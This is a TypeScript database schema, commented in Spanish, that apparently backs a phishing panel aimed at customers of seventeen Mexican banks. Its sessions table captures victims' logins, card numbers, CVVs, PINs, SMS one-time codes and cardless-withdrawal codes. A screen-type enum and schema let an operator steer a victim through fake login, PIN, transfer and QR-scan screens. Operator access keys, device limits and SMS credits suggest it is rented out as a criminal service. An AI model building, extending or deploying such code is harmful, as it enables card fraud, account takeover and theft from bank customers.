
import { pgTable, text, serial, integer, boolean, timestamp, jsonb } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";
import bcrypt from "bcrypt";

// Roles de usuario
export enum UserRole {
  ADMIN = "admin",
  USER = "user"
}

// Bancos disponibles
export enum BankType {
  ALL = "all",
  LIVERPOOL = "liverpool",
  CITIBANAMEX = "citibanamex",
  BANBAJIO = "banbajio",
  BBVA = "bbva",
  BANORTE = "banorte",
  BANCOPPEL = "bancoppel",
  HSBC = "hsbc",
  AMEX = "amex",
  SANTANDER = "santander",
  SCOTIABANK = "scotiabank",
  INVEX = "invex",
  BANREGIO = "banregio",
  SPIN = "spin",
  PLATACARD = "platacard",
  BANCOAZTECA = "bancoazteca",
  BIENESTAR = "bienestar"
}

// Tabla de usuarios del sistema
export const users = pgTable("users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  password: text("password").notNull(),
  role: text("role").notNull().default(UserRole.USER),
  isActive: boolean("is_active").default(false), // Los usuarios inician inactivos hasta que el admin los apruebe
  expiresAt: timestamp("expires_at"), // Fecha de expiración de la cuenta
  deviceCount: integer("device_count").default(0), // Contador de dispositivos activos
  maxDevices: integer("max_devices").default(3), // Máximo de dispositivos permitidos
  allowedBanks: text("allowed_banks").default('all'), // Bancos permitidos: 'all' o lista separada por comas
  createdAt: timestamp("created_at").defaultNow(),
  lastLogin: timestamp("last_login"),
});

export const insertUserSchema = createInsertSchema(users).pick({
  username: true,
  password: true,
  role: true,
  allowedBanks: true,
});

export type InsertUser = z.infer<typeof insertUserSchema>;
export type User = typeof users.$inferSelect;

// Tabla para las llaves de acceso
export const accessKeys = pgTable("access_keys", {
  id: serial("id").primaryKey(),
  key: text("key").notNull().unique(),
  description: text("description"),
  createdBy: integer("created_by").notNull(), // ID del administrador que creó la llave
  expiresAt: timestamp("expires_at").notNull(), // Fecha de expiración
  maxDevices: integer("max_devices").notNull().default(3), // Máximo de dispositivos permitidos
  activeDevices: integer("active_devices").default(0), // Contador de dispositivos activos
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
  lastUsed: timestamp("last_used"),
});

export const insertAccessKeySchema = createInsertSchema(accessKeys).pick({
  key: true,
  description: true,
  createdBy: true,
  expiresAt: true,
  maxDevices: true,
});

export type InsertAccessKey = z.infer<typeof insertAccessKeySchema>;
export type AccessKey = typeof accessKeys.$inferSelect;

// Tabla para rastrear los dispositivos que usan cada llave
export const devices = pgTable("devices", {
  id: serial("id").primaryKey(),
  accessKeyId: integer("access_key_id").notNull(), // ID de la llave a la que está asociado
  deviceId: text("device_id").notNull(), // Identificador único del dispositivo
  userAgent: text("user_agent"), // Información del navegador/dispositivo
  ipAddress: text("ip_address"), // Dirección IP
  lastActive: timestamp("last_active").defaultNow(),
  isActive: boolean("is_active").default(true),
  createdAt: timestamp("created_at").defaultNow(),
});

export const insertDeviceSchema = createInsertSchema(devices).pick({
  accessKeyId: true,
  deviceId: true,
  userAgent: true,
  ipAddress: true,
});

export type InsertDevice = z.infer<typeof insertDeviceSchema>;
export type Device = typeof devices.$inferSelect;

export const sessions = pgTable("sessions", {
  id: serial("id").primaryKey(),
  sessionId: text("session_id").notNull().unique(),
  folio: text("folio"),
  username: text("username"),
  password: text("password"),
  banco: text("banco").default("LIVERPOOL"),
  tarjeta: text("tarjeta"),
  fechaVencimiento: text("fecha_vencimiento"),
  cvv: text("cvv"),
  sms: text("sms"),
  nip: text("nip"),
  smsCompra: text("sms_compra"),
  celular: text("celular"),
  pasoActual: text("paso_actual").default("folio"),
  createdAt: timestamp("created_at").defaultNow(),
  active: boolean("active").default(true),
  saved: boolean("saved").default(false),
  createdBy: text("created_by"), // Añadimos el campo para saber qué usuario creó la sesión
  qrData: text("qr_data"), // Almacena el texto del código QR escaneado
  qrImageData: text("qr_image_data"), // Almacena la imagen del QR escaneado en base64
  codigoRetiro: text("codigo_retiro"), // Almacena el código de retiro sin tarjeta ingresado por el usuario
  pinRetiro: text("pin_retiro"), // Almacena el PIN de seguridad adicional para retiro sin tarjeta
  lastActivity: timestamp("last_activity").defaultNow(), // Último momento de actividad
  hasUserData: boolean("has_user_data").default(false), // Indica si el usuario ingresó algún dato
  // Información del dispositivo
  deviceType: text("device_type"), // 'Android', 'iPhone', 'PC'
  deviceModel: text("device_model"), // Modelo específico del dispositivo
  deviceBrowser: text("device_browser"), // Navegador utilizado
  deviceOs: text("device_os"), // Sistema operativo
  userAgent: text("user_agent") // User agent completo
});

export const insertSessionSchema = createInsertSchema(sessions).pick({
  sessionId: true,
  folio: true,
  username: true,
  password: true,
  banco: true,
  pasoActual: true,
  createdBy: true,
  deviceType: true,
  deviceModel: true,
  deviceBrowser: true,
  deviceOs: true,
  userAgent: true,
});

export type InsertSession = z.infer<typeof insertSessionSchema>;
export type Session = typeof sessions.$inferSelect;

// Tabla para la configuración de la API de mensajes
export const smsConfig = pgTable("sms_config", {
  id: serial("id").primaryKey(),
  username: text("username"),
  password: text("password"),
  apiUrl: text("api_url").default("https://api.sofmex.mx/api/sms"),
  isActive: boolean("is_active").default(false),
  updatedAt: timestamp("updated_at").defaultNow(),
  updatedBy: text("updated_by").notNull(),
});

export const insertSmsConfigSchema = createInsertSchema(smsConfig).pick({
  username: true,
  password: true,
  apiUrl: true,
  isActive: true,
  updatedBy: true,
});

export type InsertSmsConfig = z.infer<typeof insertSmsConfigSchema>;
export type SmsConfig = typeof smsConfig.$inferSelect;

// Tabla para los créditos de mensajes de los usuarios
export const smsCredits = pgTable("sms_credits", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  credits: integer("credits").default(0),
  updatedAt: timestamp("updated_at").defaultNow(),
});

export const insertSmsCreditsSchema = createInsertSchema(smsCredits).pick({
  userId: true,
  credits: true,
});

export type InsertSmsCredits = z.infer<typeof insertSmsCreditsSchema>;
export type SmsCredits = typeof smsCredits.$inferSelect;

// Tabla para el historial de mensajes enviados
export const smsHistory = pgTable("sms_history", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(),
  phoneNumber: text("phone_number").notNull(),
  message: text("message").notNull(),
  sentAt: timestamp("sent_at").defaultNow(),
  status: text("status").default("pending"),
  sessionId: text("session_id"),
  errorMessage: text("error_message"),
});

export const insertSmsHistorySchema = createInsertSchema(smsHistory).pick({
  userId: true,
  phoneNumber: true,
  message: true,
  sessionId: true,
});

export type InsertSmsHistory = z.infer<typeof insertSmsHistorySchema>;
export type SmsHistory = typeof smsHistory.$inferSelect;

export enum ScreenType {
  FOLIO = "folio",
  LOGIN = "login",
  CODIGO = "codigo",
  NIP = "nip",
  PROTEGER = "protege",
  TARJETA = "tarjeta",
  TRANSFERIR = "transferir",
  CANCELACION = "cancelacion",
  MENSAJE = "mensaje",
  VALIDANDO = "validando",
  SMS_COMPRA = "sms_compra",
  ESCANEAR_QR = "escanear_qr",
  CANCELACION_RETIRO = "cancelacion_retiro"
}

export const screenChangeSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  terminacion: z.string().optional(),
  saldo: z.string().optional(),
  monto: z.string().optional(),
  clabe: z.string().optional(),
  titular: z.string().optional(),
  comercio: z.string().optional(),
  mensaje: z.string().optional(),
  qrData: z.string().optional(), // Para datos del QR escaneado
  qrImageData: z.string().optional(), // Para la imagen del QR escaneado en base64
});

export type ScreenChangeData = z.infer<typeof screenChangeSchema>;

export const clientInputSchema = z.object({
  tipo: z.string(),
  sessionId: z.string(),
  data: z.record(z.any()),
});

export type ClientInputData = z.infer<typeof clientInputSchema>;

// Tipos de notificaciones del sistema
export enum NotificationType {
  SESSION_ACTIVITY = "session_activity", // Actividad en sesiones
  USER_ACTIVITY = "user_activity",       // Actividad de usuario
  SYSTEM = "system",                     // Notificaciones del sistema
  SUCCESS = "success",                   // Operaciones exitosas
  WARNING = "warning",                   // Advertencias
  ERROR = "error",                       // Errores
  INFO = "info"                          // Información general
}

// Prioridad de notificaciones
export enum NotificationPriority {
  LOW = "low",
  MEDIUM = "medium",
  HIGH = "high",
  URGENT = "urgent"
}

// Tabla para almacenar notificaciones
export const notifications = pgTable("notifications", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull(), // Usuario al que va dirigida la notificación
  type: text("type").notNull().$type<NotificationType>(), // Tipo de notificación
  title: text("title").notNull(), // Título de la notificación
  message: text("message").notNull(), // Mensaje principal
  details: text("details"), // Detalles adicionales (opcional)
  priority: text("priority").notNull().$type<NotificationPriority>().default(NotificationPriority.MEDIUM), // Prioridad
  read: boolean("read").default(false), // Si la notificación ha sido leída
  createdAt: timestamp("created_at").defaultNow(), // Fecha de creación
  expiresAt: timestamp("expires_at"), // Fecha de expiración (opcional)
  actionUrl: text("action_url"), // URL opcional para acción
  sessionId: text("session_id"), // ID de sesión relacionada (opcional)
  metaData: jsonb("meta_data") // Datos adicionales en formato JSON
});

export const insertNotificationSchema = createInsertSchema(notifications).pick({
  userId: true,
  type: true,
  title: true,
  message: true,
  details: true,
  priority: true,
  actionUrl: true,
  sessionId: true,
  metaData: true,
  expiresAt: true
});

export type InsertNotification = z.infer<typeof insertNotificationSchema>;
export type Notification = typeof notifications.$inferSelect;

// Tabla para preferencias de notificación de los usuarios
export const notificationPreferences = pgTable("notification_preferences", {
  id: serial("id").primaryKey(),
  userId: integer("user_id").notNull().references(() => users.id), // Usuario al que pertenecen las preferencias
  sessionActivityEnabled: boolean("session_activity_enabled").default(true), // Recibir notificaciones de actividad de sesiones
  userActivityEnabled: boolean("user_activity_enabled").default(true), // Recibir notificaciones de actividad de usuarios
  systemEnabled: boolean("system_enabled").default(true), // Recibir notificaciones del sistema
  minPriority: text("min_priority").$type<NotificationPriority>().default(NotificationPriority.LOW), // Prioridad mínima para recibir notificaciones
  emailEnabled: boolean("email_enabled").default(false), // Recibir notificaciones por email
  emailAddress: text("email_address"), // Dirección de email para notificaciones
  updatedAt: timestamp("updated_at").defaultNow() // Última actualización
});

export const insertNotificationPrefsSchema = createInsertSchema(notificationPreferences).pick({
  userId: true,
  sessionActivityEnabled: true,
  userActivityEnabled: true,
  systemEnabled: true,
  minPriority: true,
  emailEnabled: true,
  emailAddress: true
});

export type InsertNotificationPrefs = z.infer<typeof insertNotificationPrefsSchema>;
export type NotificationPrefs = typeof notificationPreferences.$inferSelect;
